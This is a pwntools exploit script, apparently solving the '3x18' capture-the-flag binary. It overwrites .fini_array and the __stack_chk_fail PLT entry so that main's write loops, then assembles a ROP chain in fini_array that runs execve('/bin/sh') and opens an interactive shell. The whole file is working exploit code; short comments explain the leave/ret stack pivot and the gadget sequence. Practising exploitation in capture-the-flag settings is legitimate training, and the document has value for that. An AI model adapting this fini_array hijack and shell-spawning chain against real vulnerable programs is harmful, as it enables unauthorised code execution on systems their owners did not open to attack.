from pwn import *
from time import sleep
p = process("./3x18")
elf = ELF("./3x18")

fini_array = 0x4b40f0
call_1 = 0x402960
main_read = 0x401ba3
target_plt = 0x4b70c0

pop_rax=0x41e4af
pop_rdi = 0x401696
pop_rdx_rsi=0x44a309
syscall = 0x446e2c
bin_sh_addr = fini_array + 0x50
leave_ret = 0x401c4b

p.sendlineafter("addr:" , str(fini_array))
p.sendafter("data:" , p64(call_1) + p64(main_read)) # fini_array[1]() 
# 
p.sendlineafter("addr:",str(target_plt)) # set stack_check_fail 's plt part to ulimit addr write
p.sendafter("data:",p64(main_read))
p.sendlineafter("addr:",str(fini_array))
p.sendafter("data:",p64(fini_array + 8)+p64(leave_ret)) # rbp and fini_array[1]
p.sendlineafter("addr:",str(fini_array + 0x10)) 
p.sendafter("data:",p64(pop_rdi))
p.sendlineafter("addr:",str(fini_array + 0x18))
p.sendafter("data:",p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
p.sendlineafter("addr:",str(fini_array + 0x30))
p.sendafter("data:",p64(pop_rdx_rsi)+p64(0)+p64(0))
p.sendlineafter("addr:",str(fini_array + 0x48))
p.sendafter("data:",p64(syscall)+"/bin/sh\x00")


p.sendafter("addr:",str(target_plt))
p.sendlineafter("data:",p64(call_1)) 
# leave; ret; $rsp = 0x7f*** => [fini_array] = fini_array + 8 = $rbp 
# leave; ret; $rsp = $rbp + 8 ; $rbp = & 'leave ; ret'
# pop rdi; ret; # /bin/sh
# pop rax; ret; # 0x3b # execve
# pop rdx; pop rsi; ret; # null # null
# syscall; # exeve("/bin/sh\x00" , null , null)

p.interactive()
